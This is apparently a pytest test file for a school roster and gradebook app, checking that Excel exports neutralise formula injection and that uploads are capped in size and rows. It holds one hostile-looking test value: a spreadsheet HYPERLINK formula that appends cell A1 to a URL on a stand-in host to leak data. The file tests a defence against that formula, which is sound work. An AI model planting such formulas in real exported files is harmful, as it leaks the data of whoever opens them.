from __future__ import annotations

from io import BytesIO

import pytest
from openpyxl import Workbook, load_workbook

from app.core.errors import ValidationError
from app.models import StudyGroup, User, UserRole
from app.services.domain import journal_export, roster
from app.services.domain.journal import Journal, JournalRow

# Попади эта строка в ячейку формулой, Excel утащил бы содержимое соседней
# ячейки на чужой адрес у того, кто открыл файл.
FORMULA = '=HYPERLINK("http://example.test/?"&A1,"Открыть")'


def _sheet(content: bytes):
    return load_workbook(BytesIO(content)).active


def test_accounts_workbook_keeps_formula_as_text() -> None:
    sheet = _sheet(roster.build_accounts_workbook([(FORMULA, "ivanov", "Ab12cd34")]))
    cell = sheet.cell(row=2, column=1)
    assert cell.value == FORMULA
    assert cell.data_type == "s"


def test_journal_workbook_keeps_formula_as_text() -> None:
    student = User(
        login="ivanov", password_hash="x", role=UserRole.STUDENT,
        last_name=FORMULA, first_name="Иван",
    )
    grid = Journal(columns=[], rows=[JournalRow(student=student)], term_weights={})
    sheet = _sheet(
        journal_export.build_workbook(grid, group=StudyGroup(name="7А"))
    )
    cell = sheet.cell(row=6, column=1)
    assert cell.value.startswith("=")
    assert cell.data_type == "s"


def test_upload_size_is_limited() -> None:
    with pytest.raises(ValidationError):
        roster.check_upload_size(b"x" * (roster.MAX_UPLOAD_BYTES + 1))
    with pytest.raises(ValidationError):
        roster.parse_upload("list.csv", b"x" * (roster.MAX_UPLOAD_BYTES + 1))


def test_xlsx_rows_are_read_with_a_cap() -> None:
    # MAX_ROWS считает уже разобранных учеников и до пустых строк не доходит,
    # поэтому у разбора есть отдельный предел на число прочитанных строк.
    workbook = Workbook()
    sheet = workbook.active
    over = roster.MAX_SCANNED_ROWS + 500
    sheet.cell(row=over, column=1, value="")
    buffer = BytesIO()
    workbook.save(buffer)

    with pytest.raises(ValidationError):
        roster.parse_xlsx(buffer.getvalue())


def test_text_list_stops_at_the_row_limit() -> None:
    with pytest.raises(ValidationError):
        roster.parse_text("\n".join("Иванов Иван" for _ in range(10_000)))
